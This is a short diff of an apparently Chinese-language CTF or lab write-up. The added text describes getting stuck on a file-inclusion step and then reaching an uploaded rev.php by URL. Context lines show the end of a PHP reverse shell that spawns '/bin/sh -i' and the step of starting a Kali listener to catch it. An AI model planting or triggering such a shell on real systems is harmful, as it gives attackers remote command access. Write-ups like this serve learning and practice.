@@ -195,6 +195,8 @@ $proc = proc_open('/bin/sh -i',
     $pipes);
 ?>
 ```
+
+这里被卡了，我一直尝试使用该页面的文件包含去执行代码，但是包含只会包含出源码，卡了一会不知道怎么执行shell，看了别人的wp才知道可以在url上访问到文件。
 开启kali监听，点击解压了的rev.php
 
 <img width="1910" height="429" alt="Image" src="https://github.com/user-attachments/assets/b05912c5-b4cc-4232-86ab-249190a59774" />
